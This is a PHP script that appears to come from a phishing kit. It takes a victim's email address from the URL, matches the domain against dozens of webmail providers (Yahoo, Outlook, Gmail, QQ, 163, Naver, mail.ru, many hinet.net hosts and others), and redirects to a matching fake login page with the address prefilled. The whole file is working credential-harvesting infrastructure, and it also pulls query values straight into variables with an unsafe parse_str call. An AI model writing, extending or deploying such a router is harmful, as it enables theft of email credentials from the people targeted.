<?php 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $userid);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@yahoo.') !== false || stripos($domain_check, '@rocketmail.') !== false || stripos($domain_check, '@ymail.') !== false){
		header('Location: yahoo/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@live.')!== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@msn.')!== false || stripos($domain_check, '@windowslive.') !== false) {
		header('Location: hotmail/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
			}
			
	elseif(stripos($domain_check, '@aol.') !== false || stripos($domain_check, '@aol.') !== false) {
		header('Location: aol/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
			}
	elseif(stripos($domain_check, '@163.com') !== false || stripos($domain_check, '@163.com') !== false || stripos($domain_check, '@163.com') !== false) {
		header('Location: 163.com/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@126.') !== false || stripos($domain_check, '@126.') !== false || stripos($domain_check, '@@126.') !== false) {
		header('Location: 126/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@gmail.') !== false || stripos($domain_check, '@google.') !== false) {
		header('Location: gmail/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@hanmail.') !== false || stripos($domain_check, '@daum.') !== false) {
		header('Location: daum/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
		}
	elseif(stripos($domain_check, '@qq.') !== false || stripos($domain_check, '@foxmail.') !== false) {
		header('Location: mailqq/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
		}
	elseif(stripos($domain_check, '@.naver.') !== false || stripos($domain_check, '@naver.') !== false) {
		header('Location: nv/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
		}
	elseif(stripos($domain_check, '@microsoft') !== false || stripos($domain_check, '@onmicrosoft.')!== false || stripos($domain_check, '@office365.') !== false) {
		header('Location: office365/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
		}
	elseif(stripos($domain_check, '@vip.163.') !== false || stripos($domain_check, '@vip163.') !== false) {
		header('Location: vip163/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
		}
	elseif(stripos($domain_check, '@.yeah.') !== false || stripos($domain_check, '@yeah.') !== false) {
		header('Location: yeah/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
elseif(stripos($domain_check, '@comcast.') !== false || stripos($domain_check, '@comcast.') !== false) {
		header('Location: comcast/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@aliyun.') !== false || stripos($domain_check, '@aliyun.') !== false) {
		header('Location: aliyun/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
		elseif(stripos($domain_check, '@21cn.') !== false || stripos($domain_check, '@21cn.') !== false) {
		header('Location: 21cn/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@139.') !== false || stripos($domain_check, '@139.') !== false) {
		header('Location: 139/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@183.') !== false || stripos($domain_check, '@183.') !== false) {
		header('Location: 183/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@263.') !== false || stripos($domain_check, '@263.') !== false) {
		header('Location: 263/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
		elseif(stripos($domain_check, '@sohu.') !== false || stripos($domain_check, '@sohu.') !== false) {
		header('Location: sohu/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
			elseif(stripos($domain_check, '@sina.') !== false || stripos($domain_check, '@sina.') !== false) {
		header('Location: sina/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
			elseif(stripos($domain_check, '@vip.sina.') !== false || stripos($domain_check, '@vipsina.') !== false) {
		header('Location: vip.sina/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	
	elseif(stripos($domain_check, '@vip126.') !== false || stripos($domain_check, '@vip.126.') !== false) {
		header('Location: vip126.mail/index.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@yandex.ru') !== false || stripos($domain_check, '@yandexru.') !== false) {
		header('Location: yandex.ru/index.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@tom.')!== false || stripos($domain_check, '@163.net')!== false || stripos($domain_check, '@vip.tom.')!== false || stripos($domain_check, '@mailtom') !== false) {
		header('Location: mail.tom/index.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@hinet.net')!== false || stripos($domain_check, '@ms99.hinet.net')!== false || stripos($domain_check, '@ms98.hinet.net')!== false || stripos($domain_check, '@ms97.hinet.net')!== false || stripos($domain_check, '@ms96.hinet.net')!== false || stripos($domain_check, '@ms94.hinet.net')!== false || stripos($domain_check, '@ms93.hinet.net')!== false || stripos($domain_check, '@ms92.hinet.net')!== false || stripos($domain_check, '@ms91.hinet.net')!== false || stripos($domain_check, '@ms90.hinet.net')!== false || stripos($domain_check, '@ms89.hinet.net')!== false || stripos($domain_check, '@ms88.hinet.net')!== false || stripos($domain_check, '@ms87.hinet.net')!== false || stripos($domain_check, '@ms86.hinet.net')!== false || stripos($domain_check, '@ms85.hinet.net')!== false || stripos($domain_check, '@ms84.hinet.net')!== false || stripos($domain_check, '@ms28.hinet.net')!== false || stripos($domain_check, '@ms80.hinet.net')!== false || stripos($domain_check, '@ms54.hinet.net')!== false || stripos($domain_check, '@ms27.hinet.net')!== false || stripos($domain_check, '@ms79.hinet.net')!== false || stripos($domain_check, '@ms53.hinet.net')!== false || stripos($domain_check, '@ms26.hinet.net')!== false || stripos($domain_check, '@ms78.hinet.net')!== false || stripos($domain_check, '@ms52.hinet.net')!== false || stripos($domain_check, '@ms25.hinet.net')!== false || stripos($domain_check, '@ms77.hinet.net')!== false || stripos($domain_check, '@ms51.hinet.net')!== false || stripos($domain_check, '@ms24.hinet.net')!== false || stripos($domain_check, '@ms76.hinet.net')!== false || stripos($domain_check, '@ms23.hinet.net')!== false || stripos($domain_check, '@ms75.hinet.net')!== false || stripos($domain_check, '@ms49.hinet.net')!== false || stripos($domain_check, '@ms22.hinet.net')!== false || stripos($domain_check, '@ms74.hinet.net')!== false || stripos($domain_check, '@ms48.hinet.net')!== false || stripos($domain_check, '@ms21.hinet.net')!== false || stripos($domain_check, '@ms73.hinet.net')!== false || stripos($domain_check, '@ms47.hinet.net')!== false || stripos($domain_check, '@ms20.hinet.net')!== false || stripos($domain_check, '@ms72.hinet.net')!== false || stripos($domain_check, '@ms46.hinet.net')!== false || stripos($domain_check, '@ms19.hinet.net')!== false || stripos($domain_check, '@ms71.hinet.net')!== false || stripos($domain_check, '@ms45.hinet.net')!== false || stripos($domain_check, '@ms18.hinet.net')!== false || stripos($domain_check, '@ms70.hinet.net')!== false || stripos($domain_check, '@ms44.hinet.net')!== false || stripos($domain_check, '@ms17.hinet.net')!== false || stripos($domain_check, '@ms69.hinet.net')!== false || stripos($domain_check, '@ms43.hinet.net')!== false || stripos($domain_check, '@ms16.hinet.net')!== false || stripos($domain_check, '@ms68.hinet.net')!== false || stripos($domain_check, '@ms42.hinet.net')!== false || stripos($domain_check, '@ms15.hinet.net')!== false || stripos($domain_check, '@ms67.hinet.net')!== false || stripos($domain_check, '@ms41.hinet.net')!== false || stripos($domain_check, '@ms14.hinet.net')!== false || stripos($domain_check, '@ms66.hinet.net')!== false || stripos($domain_check, '@ms40.hinet.net')!== false || stripos($domain_check, '@ms13.hinet.net')!== false || stripos($domain_check, '@ms65.hinet.net')!== false || stripos($domain_check, '@ms12.hinet.net')!== false || stripos($domain_check, '@ms64.hinet.net')!== false || stripos($domain_check, '@ms38.hinet.net')!== false || stripos($domain_check, '@ms11.hinet.net')!== false || stripos($domain_check, '@ms63.hinet.net')!== false || stripos($domain_check, '@ms37.hinet.net')!== false || stripos($domain_check, '@ms10.hinet.net')!== false || stripos($domain_check, '@ms62.hinet.net')!== false || stripos($domain_check, '@ms36.hinet.net')!== false || stripos($domain_check, '@ms9.hinet.net')!== false || stripos($domain_check, '@ms61.hinet.net')!== false || stripos($domain_check, '@ms35.hinet.net')!== false || stripos($domain_check, '@ms8.hinet.net')!== false || stripos($domain_check, '@ms60.hinet.net')!== false || stripos($domain_check, '@ms34.hinet.net')!== false || stripos($domain_check, '@ms7.hinet.net')!== false || stripos($domain_check, '@ms59.hinet.net')!== false || stripos($domain_check, '@ms33.hinet.net')!== false || stripos($domain_check, '@ms6.hinet.net')!== false || stripos($domain_check, '@ms58.hinet.net')!== false || stripos($domain_check, '@ms32.hinet.net')!== false || stripos($domain_check, '@ms5.hinet.net')!== false || stripos($domain_check, '@ms5.hinet.net')!== false || stripos($domain_check, '@ms31.hinet.net')!== false || stripos($domain_check, '@ms4.hinet.net')!== false || stripos($domain_check, '@ms56.hinet.net')!== false || stripos($domain_check, '@ms30.hinet.net')!== false || stripos($domain_check, '@ms3.hinet.net')!== false || stripos($domain_check, '@ms55.hinet.net')!== false || stripos($domain_check, '@ms29.hinet.net')!== false || stripos($domain_check, '@ms2.hinet.net')!== false || stripos($domain_check, '@ms83.hinet.net')!== false || stripos($domain_check, '@ms82.hinet.net')!== false || stripos($domain_check, '@ms81.hinet.net')!== false || stripos($domain_check, '@ms1.hinet.net')!== false || stripos($domain_check, '@msa.hinet.net')!== false || stripos($domain_check, '@cm1.hinet.net')!== false || stripos($domain_check, '@hn.hinet.net')!== false || stripos($domain_check, '@ms.hinet.net')!== false || stripos($domain_check, '@umail.hinet.net') !== false || stripos($domain_check, '@.hinet.') !== false) {
		header('Location: hinet/index.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@mail.ru')!== false || stripos($domain_check, '@list.ru')!== false || stripos($domain_check, '@bk.') !== false || stripos($domain_check, '@inbox.ru')!== false || stripos($domain_check, '@mail.ru') !== false) {
		header('Location: mail.ru/index.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@mailchina.')!== false || stripos($domain_check, '@china.')!== false || stripos($domain_check, '@china.com.') !== false || stripos($domain_check, '@mailchina.') !== false) {
		header('Location: mail.china/index.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	else {
		header('Location: yt/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
		
?>